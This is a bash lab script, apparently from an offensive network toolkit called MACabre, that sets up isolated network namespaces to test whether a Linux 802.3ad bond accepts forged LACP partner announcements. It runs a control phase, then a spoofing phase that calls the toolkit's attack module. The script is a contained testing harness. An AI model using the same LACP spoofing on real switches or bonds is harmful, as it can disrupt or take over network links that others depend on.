#!/usr/bin/env bash
# Isolated LACP spoofing lab (Linux only, needs root). Uses the kernel bonding driver in 802.3ad mode.
#
# Topology, all inside network namespaces:
#
#   sw:       bond0 in 802.3ad (LACP) mode, with one slave, s1. This is the aggregate under test.
#   attacker: the other end of the link, a1. It sends LACPDUs claiming an actor system ID and key.
#
# The aggregate has no real partner on this link, so the only LACPDUs it can learn from are the
# attacker's. The bonding driver reports the partner it has learned in /proc/net/bonding/bond0.
#
#   Phase 1 (control): no LACPDUs. The bond reports no partner (00:00:00:00:00:00).
#   Phase 2 (attack): MACabre sends LACPDUs claiming the system ID and key below, one per second.
#            The lab samples the partner the bond reports during the run and at the end.
#
# Exit 0 when the bond reports the claimed system ID as its partner, 1 when it does not learn
# it, and 2 when the control already shows a partner or the setup failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/lacp_spoofing_lab.sh
#
# Requirements: iproute2 (ip), the bonding kernel module, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done
if ! modprobe bonding 2>/dev/null; then
    echo "The bonding kernel module is needed." >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLAIMED_SYSTEM="02:00:00:00:00:c1"
CLAIMED_KEY=7
FRAMES=12
CONTROL_SECONDS=8
NO_PARTNER="00:00:00:00:00:00"

stop_lab() {
    for ns in attacker sw; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add sw
ip netns add attacker

ip link add s1 type veth peer name a1
ip link set s1 netns sw
ip link set a1 netns attacker

ip netns exec sw ip link add bond0 type bond mode 802.3ad miimon 100 lacp_rate fast
ip netns exec sw ip link set bond0 up
ip netns exec sw ip link set s1 down
ip netns exec sw ip link set s1 master bond0
ip netns exec sw ip link set s1 up
ip netns exec attacker ip link set a1 up

# The partner the bond has learned, from its status file (the active aggregator's partner MAC).
partner() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | grep -m1 'Partner Mac Address' | awk '{print $NF}'
}

ATTACK_CODE='
import os, threading
from macabre.attacks.lacp_spoofing import LacpSpoofingConfig, run_lacp_spoofing
stats = run_lacp_spoofing(
    LacpSpoofingConfig(
        iface="a1",
        system_mac=os.environ["CLAIMED_SYSTEM"],
        key=int(os.environ["CLAIMED_KEY"]),
        frames=int(os.environ["FRAMES"]),
        interval=1.0,
    ),
    threading.Event(),
    lambda _: None,
)
print(stats.frames)
'

echo "Waiting for the bond to come up"
sleep 4

echo "Phase 1: control, no LACPDUs from the attacker"
sleep "$CONTROL_SECONDS"
CONTROL_PARTNER="$(partner)"
echo "  partner the bond reports: ${CONTROL_PARTNER:-none}"
echo

echo "Phase 2: attack, $FRAMES LACPDUs claiming system $CLAIMED_SYSTEM, key $CLAIMED_KEY"
ip netns exec attacker env PYTHONPATH="$ROOT/src" CLAIMED_SYSTEM="$CLAIMED_SYSTEM" CLAIMED_KEY="$CLAIMED_KEY" FRAMES="$FRAMES" \
    "$PY" -c "$ATTACK_CODE" >/dev/null &
ATTACKER_PID=$!
sleep 4
MID_PARTNER="$(partner)"
echo "  t+4s partner the bond reports: ${MID_PARTNER:-none}"
wait "$ATTACKER_PID"
sleep 2
END_PARTNER="$(partner)"
echo "  end partner the bond reports: ${END_PARTNER:-none}"
echo

if [[ "$CONTROL_PARTNER" != "$NO_PARTNER" && -n "$CONTROL_PARTNER" ]]; then
    echo "Control: the bond had a partner before the attack. Result unreliable."
    exit 2
fi
if [[ "$END_PARTNER" == "$CLAIMED_SYSTEM" ]]; then
    echo "Result: the bond accepted the claimed system $CLAIMED_SYSTEM as its LACP partner, from an attacker port with no real partner. Vulnerable."
    exit 0
fi
echo "Result: the bond did not report the claimed system as its partner (it reports ${END_PARTNER:-none}). Not validated."
exit 1
